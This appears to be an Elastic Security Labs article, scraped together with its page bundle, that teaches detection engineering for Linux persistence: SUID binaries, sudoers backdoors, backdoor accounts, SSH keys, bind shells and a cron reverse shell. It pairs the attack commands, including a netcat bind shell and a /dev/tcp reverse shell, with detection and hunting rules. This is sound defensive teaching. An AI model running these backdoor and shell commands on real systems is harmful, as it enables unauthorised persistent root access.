a misconfigured SUID or SGID binary must be present on the system, or root-level privileges must be obtained to create a backdoor. Typical privilege escalation enumeration scripts enumerate the entire filesystem for the presence of these binaries using `find`. \n\nSUID and SGID binaries are common on Linux and are available on the system by default. Generally, these cannot be exploited. An example of a misconfigured SUID binary looks like this:\n\n```\nfind / -perm -4000 -type f -exec ls -la {} \\;\n-rwsr-sr-x 1 root root 1396520 Mar 14 11:31 /bin/bash\n```\n\nThe `/bin/bash` binary is not a default SUID binary and causes a security risk. An attacker could now run `/bin/bash -p` to run bash and keep the root privileges on execution. More information on this is available at [GTFOBins](https://gtfobins.github.io/gtfobins/bash/). Although MITRE defines this as privilege escalation/defense evasion, it can (as shown) be used for persistence as well. More information by MITRE on this technique is available at [T1548.001](https://attack.mitre.org/techniques/T1548/001/).\n\n### Persistence through T1548.001 - setuid and setgid\n\nThis method requires root privileges, as it sets the SUID bit to a set of executables: \n\n```\nsudo ./panix.sh --suid --default\n[+] SUID privilege granted to /usr/bin/find\n[+] SUID privilege granted to /usr/bin/dash\n[-] python is not present on the system.\n[+] SUID privilege granted to /usr/bin/python3                                                                                       \n```\n\nAfter setting SUID permissions to the binary, it can be executed in a manner that will allow the user to keep the root privileges:\n\n```\n\n/usr/bin/find . -exec /bin/sh -p \\; -quit\nwhoami\nroot\n```\n\nLooking at the events this generates, we can see a discrepancy between the user ID and real user ID:\n\n![Events generated as a result of SUID/SGID persistence establishment](/assets/images/primer-on-persistence-mechanisms/image8.png \"Events generated as a result of SUID/SGID persistence establishment\")\n\nAfter executing PANIX with `sudo`, SUID permissions were granted to `/usr/bin/find`, `/usr/bin/dash`, and `/usr/bin/python3` using `chmod`. Subsequently, `/usr/bin/find` was utilized to run `/bin/sh` with privileged mode (`-p`) to obtain a root shell. Typically, the real user ID of a process matches the effective user ID. However, there are exceptions, such as when using `sudo`, `su`, or, as demonstrated here, a SUID binary, where the real user ID differs. Using our knowledge of GTFOBins and the execution chain, we can detect several indicators of SUID and SGID abuse.\n\n| Category | Coverage                           |\n|----------|------------------------------------|\n| Process  | [SUID/SGUID Enumeration Detected](https://github.com/elastic/detection-rules/blob/main/rules/linux/discovery_suid_sguid_enumeration.toml)    |\n|          | [Setuid / Setgid Bit Set via chmod](https://github.com/elastic/detection-rules/blob/main/rules/linux/privilege_escalation_potential_suid_sgid_exploitation.toml)  |\n|          | [Privilege Escalation via SUID/SGID](https://github.com/elastic/detection-rules/blob/main/rules/cross-platform/privilege_escalation_setuid_setgid_bit_set_via_chmod.toml) |\n\n### Hunting for T1548.001 - setuid and setgid\n\nThe simplest and most effective way of hunting for SUID and SGID files is to search the filesystem for these files through OSQuery and take note of unusual ones. The [OSQuery SUID Hunting](https://github.com/elastic/detection-rules/blob/main/hunting/linux/queries/privilege_escalation_via_suid_binaries.toml) rule can help you to hunt for this technique.\n\n## T1548.003 - abuse elevation control mechanism: sudo and sudo caching (sudoers file modification)\n\nThe `sudo` command allows users to execute commands with superuser or other user privileges. The sudoers file manages [sudo permissions](https://linux.die.net/man/5/sudoers), which dictates who can use sudo and what commands they can run. The main configuration file is located at `/etc/sudoers`.\n\nThis file contains global settings and user-specific rules for sudo access. Additionally, there is a directory used to store additional sudoers configuration files at `/etc/sudoers.d/`. Each file in this directory is treated as an extension of the main sudoers file, allowing for modular and organized sudo configurations. \n\nBoth system administrators and threat actors can misconfigure the sudoers file and its extensions. A common accidental misconfiguration might be overly permissive rules that grant users more access than necessary. Conversely, a threat actor with root access can deliberately modify these files to ensure they maintain elevated access.\n\nAn example of a misconfiguration or backdoor that allows an attacker to run any command as any user without a password prompt looks like this:\n\n```\nAttacker ALL=(ALL) NOPASSWD:ALL\n```\n\nBy exploiting such misconfigurations, an attacker can maintain persistent root access. For example, with the above backdoored configuration, the attacker can gain a root shell by executing `sudo /bin/bash`. Similarly to the previous technique, this technique is also classified as privilege escalation/defense evasion by MITRE. Of course, this is again true, but it is also a way of establishing persistence. More information on T1548.003 can be found [here](https://attack.mitre.org/techniques/T1548/003/).\n\n### Persistence through T1548.003 - sudoers file modification\n\nThe `sudo -l` command can be used to list out the allowed (and forbidden) commands for the user on the current host. By default, a non-root user cannot run any commands using sudo without specifying a password. \n\n```\nsudo -l\n[sudo] password for attacker:\n```\n\nLet’s add a backdoor entry for the `attacker` user:\n\n```\nsudo ./panix.sh --sudoers --username attacker\n[+] User attacker can now run all commands without a sudo password.\n```\n\nAfter adding a backdoor in the sudoers file and rerunning the `sudo -l` command, we see that the attacker can now run any command on the system with sudo without specifying a password.\n\n```\n\u003e sudo -l\n\u003e User attacker may run the following commands on ubuntu-persistence-research:\n\u003e  (ALL : ALL) ALL\n\u003e  (ALL) NOPASSWD: ALL \n```\n\nAfter planting this backdoor, not much traces are left behind, other than the creation of the `/etc/sudoers.d/attacker` file.\n\n![Events generated as a result of sudoers file modification persistence establishment](/assets/images/primer-on-persistence-mechanisms/image6.png \"Events generated as a result of sudoers file modification persistence establishment\")\n\nThis backdoor can also be established by adding to the `/etc/sudoers` file, which would not generate a file creation event. This event can be captured via FIM.\n\n| Category | Coverage                                                     |\n|----------|--------------------------------------------------------------|\n| File     | [Sudoers File Modification](https://github.com/elastic/detection-rules/blob/main/rules/cross-platform/privilege_escalation_sudoers_file_mod.toml)                                    |\n|          | [Potential Persistence via File Modification](https://github.com/elastic/detection-rules/blob/main/rules/integrations/fim/persistence_suspicious_file_modifications.toml)                  |\n| Process  | [Potential Privilege Escalation via Sudoers File Modification](https://github.com/elastic/detection-rules/blob/main/rules/cross-platform/privilege_escalation_echo_nopasswd_sudoers.toml) |\n\n### Hunting for T1548.003 - sudoers file modification\n\nOSQuery provides a module that displays all sudoers files and rules through a simple and effective live hunt, available at [Privilege Escalation Identification via Existing Sudoers File](https://github.com/elastic/detection-rules/blob/main/hunting/linux/queries/privilege_escalation_via_existing_sudoers.toml).\n\n## T1098/T1136 - account manipulation/creation\n\nPersistence can be established through the creation or modification of user accounts. By manipulating user credentials or permissions, attackers can ensure long-term access to a compromised system. This section covers various methods of achieving persistence through user account manipulation. MITRE divides this section into [T1098](https://attack.mitre.org/techniques/T1098/) (account manipulation) and [T1136](https://attack.mitre.org/techniques/T1136/) (create account).\n\n### T1136.001 - create account: local account\n\nCreating a new user account is a straightforward way to establish persistence. An attacker with root privileges can add a new user, ensuring they maintain access to the system even if other backdoors are removed. For example:\n\n```\nuseradd -m -s /bin/bash backdooruser\necho 'backdooruser:password' | chpasswd\n```\n\nThis creates a new user called `backdooruser` with a password of `password`.\n\n### T1098 - account manipulation: user credential modification\n\nModifying the credentials of an existing user can also provide persistent access. This might involve changing the password of a privileged user account.\n\n```\necho 'targetuser:newpassword' | chpasswd\n```\n\nThis changes the password for `targetuser` to `newpassword`.\n\n### T1098 - account manipulation: direct /etc/passwd file modification\n\nDirectly writing to the `/etc/passwd` file is another method for modifying user accounts. This approach allows attackers to manually add or modify user entries, potentially avoiding detection.\n\n```\necho \"malicioususer:\u003copenssl-hash\u003e:0:0:root:/root:/bin/bash\" \u003e\u003e /etc/passwd\n```\n\nWhere `\u003c;openssl-hash\u003e` is a hash that can be generated through `openssl passwd \"$password\".`\n\nThe command above creates a new user `malicioususer`, adds them to the `sudo group`, and sets a password. Similarly, this attack can be performed on the `/etc/shadow` file, by replacing the hash for a user’s password with a known hash.\n\n### T1136.001 - create account: backdoor user creation\n\nA backdoor user is a user account created or modified specifically to maintain access to the system. This account often has elevated privileges and is intended to be difficult to detect. One method involves creating a user with a UID of 0, effectively making it a root-equivalent user. This approach is detailed in a blog post called [Backdoor users on Linux with uid=0](https://embracethered.com/blog/posts/2021/linux-user-uid-zero-backdoor/).\n\n```\nuseradd -ou 0 -g 0 -m -d /root -s /bin/bash backdoorroot\necho 'backdoorroot:password' | chpasswd\n```\n\nThis creates a new user `backdoorroot` with UID 0, giving it root privileges.\n\n### T1098 - account manipulation: user added to privileged group\n\nAdding an existing user to a privileged group, such as the sudo group, can elevate their permissions, allowing them to execute commands with superuser privileges.\n\n```\nusermod -aG sudo existinguser\n```\n\nThis adds `existinguser` to the sudo group.\n\n### Persistence through T1098/T1136 - account manipulation/creation\n\nAll of these techniques are trivial to execute manually, but they are also built into PANIX in case you want to analyze the logs using a binary rather than a manual action. As the events generated by these techniques are not very interesting, we will not analyze them individually. We detect all the techniques described above through a vast set of detection rules.\n\n| Category | Coverage                                       |\n|----------|------------------------------------------------|\n| File     | [Potential Persistence via File Modification](https://github.com/elastic/detection-rules/blob/main/rules/integrations/fim/persistence_suspicious_file_modifications.toml)    |\n|          | [Shadow File Modification](https://github.com/elastic/detection-rules/blob/main/rules/linux/persistence_user_password_change.toml)                       |\n| Process  | [Potential Linux Backdoor User Account Creation](https://github.com/elastic/detection-rules/blob/main/rules/linux/persistence_linux_backdoor_user_creation.toml) |\n| IAM      | [Linux Group Creation](https://github.com/elastic/detection-rules/blob/main/rules/linux/persistence_linux_group_creation.toml)                          |\n|          | [Linux User Added to Privileged Group](https://github.com/elastic/detection-rules/blob/main/rules/linux/persistence_linux_user_added_to_privileged_group.toml)          |\n|          | [Linux User Account Creation](https://github.com/elastic/detection-rules/blob/main/rules/linux/persistence_linux_user_account_creation.toml)                    |\n|          | [User or Group Creation/Modification](https://github.com/elastic/detection-rules/blob/main/rules/linux/persistence_user_or_group_creation_or_modification.toml)            |\n\n### Hunting for T1098/T1136 - account manipulation/creation\n\nThere are many ways to hunt for these techniques. The above detection rules can be added as a timelines query to look back at a longer duration of time, the `/var/log/auth.log` (and equivalents on other Linux distributions) can be parsed and read, and OSQuery can be leveraged to read user info from a running system. The [Privilege Escalation/Persistence via User/Group Creation and/or Modification](https://github.com/elastic/detection-rules/blob/main/hunting/linux/queries/persistence_via_user_group_creation_modification.toml) hunt rule contains several OSQuery queries to hunt for these techniques.\n\n## T1098.004 - account manipulation: SSH\n\n[Secure Shell (SSH)](https://linux.die.net/man/1/ssh) is a protocol to securely access remote systems. It leverages public/private key pairs to authenticate users, providing a more secure alternative to password-based logins. The SSH keys consist of a private key, kept secure by the user, and a public key, shared with the remote system.\n\nThe default locations for user-specific SSH key files and configuration files are as follows:\n\n* `~/.ssh/id_rsa`\n* `~/.ssh/id_rsa.pub`\n* `~/.ssh/authorized_keys`\n* `/root/.ssh/id_rsa`\n* `/root/.ssh/id_rsa.pub`\n* `/root/.ssh/authorized_keys`\n\nA system-wide configuration is present in:\n\n* `/etc/ssh/`\n\nThe private key remains on the client machine, while the public key is copied to the remote server’s `authorized_keys` file. This setup allows the user to authenticate with the server without entering a password.\n\nSSH keys are used to authenticate remote login sessions via SSH and for services like Secure Copy Protocol (SCP) and Secure File Transfer Protocol (SFTP), which allow secure file transfers between machines.\n\nAn attacker can establish persistence on a compromised host by adding their public key to the `authorized_keys` file of a user with sufficient privileges. This ensures they can regain access to the system even if the user changes their password. This persistence method is stealthy as built-in shell commands can be used, which are commonly more difficult to capture as a data source. Additionally, it does not rely on creating new user accounts or modifying system binaries.\n\n### Persistence through T1098.004 - SSH modification\n\nSimilar to previously, PANIX can be used to establish persistence through SSH. It can also be tested by manually adding a new key to `~/.ssh/authorized_keys`, or by creating a new public/private key pair on the system. If you want to test these techniques, you can execute the following PANIX command to establish persistence by creating a new key:\n\n```\n./panix.sh --ssh-key --default\nSSH key generated:\nPrivate key: /home/user/.ssh/id_rsa18220\nPublic key: /home/user/.ssh/id_rsa1822.pub\n[+] SSH key persistence established.\n```\n\nUse the following PANIX command to add a new public key to the authorized_keys file:\n\n```\n./panix.sh  --authorized-keys --default --key \u003ckey\u003e\n[+] Persistence added to /home/user/.ssh/authorized_keys\n```\n\nFor file modification events, we can leverage FIM. We have several detection rules covering this technique in place.\n\n| Category | Coverage                                    |\n|----------|---------------------------------------------|\n| File     | [Potential Persistence via File Modification](https://github.com/elastic/detection-rules/blob/main/rules/integrations/fim/persistence_suspicious_file_modifications.toml) |\n| Process  | [SSH Key Generated via ssh-keygen](https://github.com/elastic/detection-rules/blob/main/rules/linux/persistence_ssh_key_generation.toml)            |\n\nA note on leveraging the “Potential Persistence via File Modification” rule: due to the limitation of leveraging wildcards in FIM, the FIM configuration should be adapted to represent your environment’s public/private key and authorized_keys file locations. MITRE provides additional information on this technique in [T1098.004](https://attack.mitre.org/techniques/T1098/004/).\n\n### Hunting for T1098.004 - SSH modification\n\nThe main focuses while hunting for SSH persistence are newly added public/private keys, file changes related to the `authorized_keys` files, and configuration changes. We can leverage OSQuery to hunt for all three through the queries in the [Persistence via SSH Configurations and/or Keys](https://github.com/elastic/detection-rules/blob/main/hunting/linux/queries/persistence_via_ssh_configurations_and_keys.toml) hunt.\n\n## T1059.004 - command and scripting interpreter: bind shells\n\n[A bind shell](https://www.geeksforgeeks.org/difference-between-bind-shell-and-reverse-shell/) is a remote access tool allowing an attacker to connect to a compromised system. Unlike reverse shells, which connect back to the attacker’s machine, a bind shell listens for incoming connections on the compromised host. This allows the attacker to connect at will, gaining command execution on the target machine.\n\nA bind shell typically involves the following steps:\n\n1. Listening Socket: The compromised system opens a network socket and listens for incoming connections on a specific port.\n2. Binding the Shell: When a connection is established, the system binds a command shell (such as `/bin/bash` or `/bin/sh`) to the socket.\n3. Remote Access: The attacker connects to the bind shell using a network client (like `netcat`) and gains access to the command shell on the compromised system.\n\nAn attacker can set up a bind shell in various ways, ranging from simple one-liners to more sophisticated scripts. Here is an example of a bind shell using the traditional version of netcat:\n\n```\nnc -lvnp 9001 -e /bin/bash\n```\n\nOnce the bind shell is set up, the attacker can connect to it from their machine:\n\n```\nnc -nv \u003ctarget_ip\u003e 4444\n```\n\nTo maintain persistence, the bind shell must be set to start automatically upon system boot or reboot. This can be achieved through various methods we discussed earlier, such as `cron`, `Systemd,` or methods discussed in the next part of this Linux detection engineering series.\n\nMITRE does not have a specific bind/reverse-shell technique, and probably classifies bind shells as the execution technique. However, the bind shell is used for persistence in our use case. Some more information from MITRE on bind/reverse shells is available at [T1059.004](https://attack.mitre.org/techniques/T1059/004/).\n\n### Persistence through T1059.004 - bind shells\n\nDetecting bind shells through behavioral rules is inherently challenging because their behavior is typically benign and indistinguishable from legitimate processes. A bind shell opens a network socket and waits for an incoming connection, a common activity for many legitimate services. When an attacker connects, it merely results in a network connection and the initiation of a shell session, which are both normal operations on a system.\n\nDue to behavioral detection's limitations, the most reliable method for identifying bind shells is static signature detection. This approach involves scanning the file system or memory for known shellcode patterns associated with bind shells.\n\nBy leveraging static signatures, we can identify and prevent bind shells more effectively than relying solely on behavioral analysis. This approach helps detect the specific code sequences used by bind shells, regardless of their behavior, ensuring a more robust defense against this type of persistence mechanism.\n\nAs all of our signature-based detections are open-source, you can check them out by visiting our [protections-artifacts YARA repository](https://github.com/elastic/protections-artifacts/tree/main/yara/rules). If you want to analyze this method within your tooling, you can leverage PANIX to set up a bind shell and connect to it using `nc`. To do so, execute the following command:\n\n```\n./panix.sh --bind-shell --default --architecture x64\n[+] Bind shell /tmp/bd64 was created, executed and backgrounded.\n[+] The bind shell is listening on port 9001.\n[+] To interact with it from a different system, use: nc -nv \u003cIP\u003e 9001\n[+] Bind shell persistence established!\n```\n\n### Hunting for T1059.004 - bind shells\n\nAlthough writing solid behavioral detection rules that do not provide false positives on a regular basis is near impossible, hunting for them is not. Based on the behavior of a bind shell, we know that we can look for long running processes, listening ports and listening sockets. To do so, we can leverage OSQuery. Several hunts are available for this scenario within the [Persistence Through Reverse/Bind Shells](https://github.com/elastic/detection-rules/blob/main/hunting/linux/queries/persistence_reverse_bind_shells.toml) hunting rule.\n\n## T1059.004 - command and scripting interpreter: reverse shells\n\nReverse shells are utilized in many of the persistence techniques discussed in this article and will be further explored in upcoming parts. While specific rules for detecting reverse shells were not added to many of the techniques above, they are very relevant. To maintain consistency and ensure comprehensive coverage, the following detection and endpoint rules are included to capture these persistence mechanisms.\n\n| Category | Coverage                                   |\n|----------|--------------------------------------------|\n| Process  | [Suspicious Execution via setsid and nohup](https://github.com/elastic/protections-artifacts/blob/main/behavior/rules/linux/execution_suspicious_execution_via_setsid_and_nohup.toml)  |\n|          | [Suspicious Execution via a Hidden Process](https://github.com/elastic/protections-artifacts/blob/main/behavior/rules/linux/execution_suspicious_execution_via_a_hidden_process.toml)  |\n| Network  | [Linux Reverse Shell](https://github.com/elastic/protections-artifacts/blob/main/behavior/rules/execution_linux_reverse_shell.toml)                        |\n|          | [Linux Reverse Shell via Child](https://github.com/elastic/protections-artifacts/blob/main/behavior/rules/execution_linux_reverse_shell_via_child.toml)              |\n|          | [Linux Reverse Shell via Netcat](https://github.com/elastic/protections-artifacts/blob/main/behavior/rules/execution_linux_reverse_shell_via_netcat.toml)             |\n|          | [Linux Reverse Shell via Suspicious Utility](https://github.com/elastic/protections-artifacts/blob/main/behavior/rules/execution_linux_reverse_shell_via_suspicious_utility.toml) |\n|          | [Linux Reverse Shell via setsid and nohup](https://github.com/elastic/protections-artifacts/blob/main/behavior/rules/linux/execution_linux_reverse_shell_via_setsid_and_nohup.toml)   |\n|          | [Potential Meterpreter Reverse Shell](https://github.com/elastic/detection-rules/blob/main/rules/linux/execution_shell_via_meterpreter_linux.toml)        |\n|          | [Potential Reverse Shell via UDP](https://github.com/elastic/detection-rules/blob/main/rules/linux/execution_shell_via_udp_cli_utility_linux.toml)            |\n\n## Conclusion\n\nIn this part of the “Linux Detection Engineering” series, we looked into the basics of Linux persistence. If you missed the first part of the series, which focused on detection engineering with Auditd, you can catch up [here](https://www.elastic.co/security-labs/linux-detection-engineering-with-auditd). This article explored various persistence techniques, including scheduled tasks, systemd services, shell profile modifications, XDG autostart configurations, SUID/SGID binaries, sudoers rules, user and group creations/modifications, SSH key, and authorized_key modifications, bind and reverse shells.\n\nNot only did the explanation cover how each persistence method operates, but it also provided practical demonstrations of configuring them using a straightforward tool called [PANIX](https://github.com/Aegrah/PANIX). This hands-on approach enabled you to test the coverage of these techniques using your preferred security product. Additionally, we discussed hunting strategies for each method, ranging from ES|QL aggregation queries to live hunt queries with OSQuery.\n\nWe hope you found this format helpful. In the next article, we'll explore more advanced and lesser-known persistence methods used in the wild. Until then, happy hunting!","code":"var Component=(()=\u003e{var h=Object.create;var s=Object.defineProperty;var u=Object.getOwnPropertyDescriptor;var m=Object.getOwnPropertyNames;var p=Object.getPrototypeOf,f=Object.prototype.hasOwnProperty;var g=(t,e)=\u003e()=\u003e(e||t((e={exports:{}}).exports,e),e.exports),b=(t,e)=\u003e{for(var n in e)s(t,n,{get:e[n],enumerable:!0})},a=(t,e,n,o)=\u003e{if(e\u0026\u0026typeof e==\"object\"||typeof e==\"function\")for(let r of m(e))!f.call(t,r)\u0026\u0026r!==n\u0026\u0026s(t,r,{get:()=\u003ee[r],enumerable:!(o=u(e,r))||o.enumerable});return t};var y=(t,e,n)=\u003e(n=t!=null?h(p(t)):{},a(e||!t||!t.__esModule?s(n,\"default\",{value:t,enumerable:!0}):n,t)),w=t=\u003ea(s({},\"__esModule\",{value:!0}),t);var c=g((S,l)=\u003e{l.exports=_jsx_runtime});var _={};b(_,{default:()=\u003ek,frontmatter:()=\u003ev});var i=y(c()),v={title:\"Linux Detection Engineering - A primer on persistence mechanisms\",slug:\"primer-on-persistence-mechanisms\",date:\"2024-08-21\",subtitle:\"A walkthrough on how threat actors establish persistence on Linux systems and how to hunt for these techniques.\",description:\"In this second part of the Linux Detection Engineering series, we map multiple Linux persistence mechanisms to the MITRE ATT\u0026CK framework, explain how they work, and how to detect them.\",author:[{slug:\"ruben-groenewoud\"}],image:\"primer-on-persistence-mechanisms.jpg\",category:[{slug:\"detection-science\"}],tags:[\"linux\",\"persistence\"]};function d(t){let e=Object.assign({h2:\"h2\",p:\"p\",a:\"a\",ul:\"ul\",li:\"li\",ol:\"ol\",h3:\"h3\",code:\"code\",pre:\"pre\",h4:\"h4\",img:\"img\",div:\"div\",table:\"table\",thead:\"thead\",tr:\"tr\",th:\"th\",tbody:\"tbody\",td:\"td\",em:\"em\"},t.components);return(0,i.jsxs)(i.Fragment,{children:[(0,i.jsx)(e.h2,{id:\"introduction\",children:\"Introduction\"}),`\n`,(0,i.jsx)(e.p,{children:\"In this second part of the Linux Detection Engineering series, we'll examine Linux persistence mechanisms in detail, starting with common or straightforward methods and moving toward more complex or obscure techniques. The goal is to educate defenders and security researchers on the foundational aspects of Linux persistence techniques by examining both trivial and more complicated methods, understanding how these methods work, how to hunt for them, and how to develop effective detection strategies.\"}),`\n`,(0,i.jsxs)(e.p,{children:['For those who missed the first part, \"Linux Detection Engineering with Auditd\", it can be found ',(0,i.jsx)(e.a,{href:\"https://www.elastic.co/security-labs/linux-detection-engineering-with-auditd\",rel:\"nofollow\",children:\"here\"}),\".\"]}),`\n`,(0,i.jsxs)(e.p,{children:[\"For this installment, we'll set up the persistence mechanisms, analyze the logs, and observe the potential detection opportunities. To aid in this process, we\\u2019re sharing \",(0,i.jsx)(e.a,{href:\"https://github.com/Aegrah/PANIX\",rel:\"nofollow\",children:\"PANIX\"}),\", a Linux persistence tool developed by Ruben Groenewoud of Elastic Security. PANIX simplifies and customizes persistence setup to test your detections.\"]}),`\n`,(0,i.jsx)(e.p,{children:\"By the end of this article, you'll have a solid understanding of each persistence mechanism we describe, including:\"}),`\n`,(0,i.jsxs)(e.ul,{children:[`\n`,(0,i.jsx)(e.li,{children:\"How it works (theory)\"}),`\n`,(0,i.jsx)(e.li,{children:\"How to set it up (practice)\"}),`\n`,(0,i.jsx)(e.li,{children:\"How to detect it (SIEM and Endpoint rules)\"}),`\n`,(0,i.jsx)(e.li,{children:\"How to hunt for it (ES|QL and OSQuery hunts)\"}),`\n`]}),`\n`,(0,i.jsx)(e.p,{children:\"Step into the world of Linux persistence with us, it\\u2019s fun!\"}),`\n`,(0,i.jsx)(e.h2,{id:\"what-is-persistence\",children:\"What is persistence?\"}),`\n`,(0,i.jsxs)(e.p,{children:[\"Let\\u2019s start with the basics. \",(0,i.jsx)(e.a,{href:\"https://attack.mitre.org/tactics/TA0003/\",rel:\"nofollow\",children:\"Persistence\"}),\" refers to an attacker's ability to maintain a foothold in a compromised system or network even after reboots, password changes, or other attempts to remove them.\"]}),`\n`,(0,i.jsx)(e.p,{children:\"Persistence is crucial for attackers, ensuring extended access to the target environment. This enables them to gather intelligence, understand the environment, move laterally through the network, and work towards achieving their objectives.\"}),`\n`,(0,i.jsx)(e.p,{children:\"Given that most malware attempts to establish some form of persistence automatically, this phase is critical for defenders to understand. Ideally, attacks should be detected and prevented during initial access, but this is not always possible. Many malware samples also leverage multiple persistence techniques to ensure continued access. Notably, these persistence mechanisms can often be detected with robust defenses in place.\"}),`\n`,(0,i.jsx)(e.p,{children:\"Even if an attack is detected, the initial access vector is patched and mitigated, but any leftover persistence mechanism can allow the attackers to regain access and resume their operations. Therefore, it's essential to monitor the establishment of some persistence mechanisms close to real time and hunt others regularly.\"}),`\n`,(0,i.jsxs)(e.p,{children:[\"To support this effort, Elastic utilizes the MITRE ATT\u0026CK framework as the primary lexicon for categorizing techniques in most of our detection artifacts. \",(0,i.jsx)(e.a,{href:\"https://attack.mitre.org/matrices/enterprise/\",rel:\"nofollow\",children:\"MITRE ATT\u0026CK\"}),\" is a globally accessible knowledge base of adversary tactics and techniques based on real-world observations. It is commonly used as a foundation for developing specific threat models and methodologies within the field of cybersecurity. By leveraging this comprehensive framework, we enhance our ability to detect, understand, and mitigate persistent threats effectively.\"]}),`\n`,(0,i.jsx)(e.h2,{id:\"setup\",children:\"Setup\"}),`\n`,(0,i.jsxs)(e.p,{children:[\"To ensure you are prepared to detect the persistence mechanisms discussed in this article, \",(0,i.jsx)(e.a,{href:\"https://www.elastic.co/guide/en/security/current/prebuilt-rules-management.html#update-prebuilt-rules\",rel:\"nofollow\",children:\"enabling and updating our pre-built detection rules is important\"}),\". If you are working with a custom-built ruleset and do not use all of our pre-built rules, this is a great opportunity to test them and fill in any gaps.\"]}),`\n`,(0,i.jsx)(e.p,{children:\"To install, enable, and update our pre-built rules, follow these steps:\"}),`\n`,(0,i.jsxs)(e.ol,{children:[`\n`,(0,i.jsx)(e.li,{children:\"Navigate to Kibana \\u2192 Security \\u2192 Rules \\u2192 Detection rules (SIEM).\"}),`\n`,(0,i.jsx)(e.li,{children:\"You will find your installed and potential new and/or updated pre-built rules here.\"}),`\n`,(0,i.jsx)(e.li,{children:'Use the \"Add Elastic rules\" button to add the latest Elastic pre-built rules.'}),`\n`,(0,i.jsx)(e.li,{children:'Use the \"Rule Updates\" tab to update existing rules.'}),`\n`]}),`\n`,(0,i.jsx)(e.p,{children:\"Now, we are ready to get started.\"}),`\n`,(0,i.jsx)(e.h2,{id:\"t1053---scheduled-taskjob\",children:\"T1053 - scheduled task/job\"}),`\n`,(0,i.jsxs)(e.p,{children:[\"Automating routine tasks is common in Unix-like operating systems for system maintenance. Some common utilities used for task scheduling are \",(0,i.jsx)(e.a,{href:\"https://www.man7.org/linux/man-pages/man8/cron.8.html\",rel:\"nofollow\",children:\"cron\"}),\" and \",(0,i.jsx)(e.a,{href:\"https://man7.org/linux/man-pages/man1/at.1p.html\",rel:\"nofollow\",children:\"at\"}),\". MITRE details information related to this technique under the identifier \",(0,i.jsx)(e.a,{href:\"https://attack.mitre.org/techniques/T1053/\",rel:\"nofollow\",children:\"T1053\"}),\".\"]}),`\n`,(0,i.jsx)(e.h3,{id:\"t1053003---scheduled-taskjob-cron\",children:\"T1053.003 - scheduled task/job: Cron\"}),`\n`,(0,i.jsxs)(e.p,{children:[(0,i.jsx)(e.a,{href:\"https://www.man7.org/linux/man-pages/man8/cron.8.html\",rel:\"nofollow\",children:\"Cron\"}),\" is a utility for scheduling recurring tasks to run at specific times or intervals. It is available by default on most Linux distributions. It is a \",(0,i.jsx)(e.a,{href:\"https://man7.org/linux/man-pages/man7/daemon.7.html\",rel:\"nofollow\",children:\"daemon\"}),\" (that is, a background process that typically performs tasks without requiring user interaction) that reads cron files from a default set of locations. These files contain commands to run periodically and/or at a scheduled time.\"]}),`\n`,(0,i.jsx)(e.p,{children:\"The scheduled task is called a cron job and can be executed with both user and root permissions, depending on the configuration. Due to its versatility, cron is an easy and stable candidate for Linux persistence, even without escalating to root privileges upon initial access.\"}),`\n`,(0,i.jsx)(e.p,{children:\"There are user-specific and system-wide cron jobs. The user-specific cron jobs commonly reside in:\"}),`\n`,(0,i.jsxs)(e.ul,{children:[`\n`,(0,i.jsx)(e.li,{children:(0,i.jsx)(e.code,{children:\"/var/spool/cron/\"})}),`\n`,(0,i.jsx)(e.li,{children:(0,i.jsx)(e.code,{children:\"/var/spool/cron/crontabs/\"})}),`\n`]}),`\n`,(0,i.jsx)(e.p,{children:\"The system-wide cron jobs are located in the following:\"}),`\n`,(0,i.jsxs)(e.ul,{children:[`\n`,(0,i.jsx)(e.li,{children:(0,i.jsx)(e.code,{children:\"/etc/crontab\"})}),`\n`,(0,i.jsx)(e.li,{children:(0,i.jsx)(e.code,{children:\"/etc/cron.d/\"})}),`\n`,(0,i.jsx)(e.li,{children:(0,i.jsx)(e.code,{children:\"/etc/cron.daily/\"})}),`\n`,(0,i.jsx)(e.li,{children:(0,i.jsx)(e.code,{children:\"/etc/cron.hourly/\"})}),`\n`,(0,i.jsx)(e.li,{children:(0,i.jsx)(e.code,{children:\"/etc/cron.monthly/\"})}),`\n`,(0,i.jsx)(e.li,{children:(0,i.jsx)(e.code,{children:\"/etc/cron.weekly/\"})}),`\n`]}),`\n`,(0,i.jsxs)(e.p,{children:[\"The cron file syntax slightly differs based on the location in which the cron file is created. For the cron files in the \",(0,i.jsx)(e.code,{children:\"/etc/\"}),\" directory, the user who will execute the job must be specified.\"]}),`\n`,(0,i.jsx)(e.pre,{children:(0,i.jsx)(e.code,{children:`* * * * * root /bin/bash -c '/srv/backup_tool.sh'\n`})}),`\n`,(0,i.jsxs)(e.p,{children:[\"Conversely, the user who created the cron files in the \",(0,i.jsx)(e.code,{children:\"/var/spool/cron/crontabs/\"}),\" directory will execute the cron files.\"]}),`\n`,(0,i.jsx)(e.pre,{children:(0,i.jsx)(e.code,{children:`* * * * * /bin/bash -c '/srv/backup_tool.sh'\n`})}),`\n`,(0,i.jsxs)(e.p,{children:[\"The asterisks are used to create the schedule. They represent (in order) minutes, hours, days (of the month), months, and days (of the week). Setting \\u201C\",(0,i.jsx)(e.code,{children:\"* * * * *\"}),\"\\u201D means the cron job is executed every minute while setting \\u201C\",(0,i.jsx)(e.code,{children:\"* * 1 12 *\"}),\"\\u201D\",(0,i.jsx)(e.code,{children:\" \"}),\"means the cron job is executed every minute on the first day of December. Information on cron scheduling is available at \",(0,i.jsx)(e.a,{href:\"https://crontab.guru/\",rel:\"nofollow\",children:\"Crontab Guru\"}),\".\"]}),`\n`,(0,i.jsx)(e.p,{children:\"Attackers can exploit these jobs to run scripts or binaries that establish reverse connections or add reverse shell commands.\"}),`\n`,(0,i.jsx)(e.pre,{children:(0,i.jsx)(e.code,{children:`* * * * * root /bin/bash -c 'sh -i \u003e\u0026 /dev/tcp/192.168.1.1/1337 0\u003e\u00261'\n`})}),`\n`,(0,i.jsxs)(e.p,{children:[\"MITRE specifies more information and real-world examples related to this technique in \",(0,i.jsx)(e.a,{href:\"https://attack.mitre.org/techniques/T1053/003/\",rel:\"nofollow\",children:\"T1053.003\"}),\".\"]}),`\n`,(0,i.jsx)(e.h4,{id:\"persistence-through-t1053003---cron\",children:\"Persistence through T1053.003 - cron\"}),`\n`,(0,i.jsxs)(e.p,{children:[\"You can manually create a system-wide cron file in any of the \",(0,i.jsx)(e.code,{children:\"/etc/\"}),\" directories or use the \",(0,i.jsx)(e.code,{children:\"crontab -e\"}),\" command to create a user-specific cron file. To more easily illustrate all of the persistence mechanisms presented in these articles, we will use PANIX. Depending on the privileges when running it, you can establish persistence like 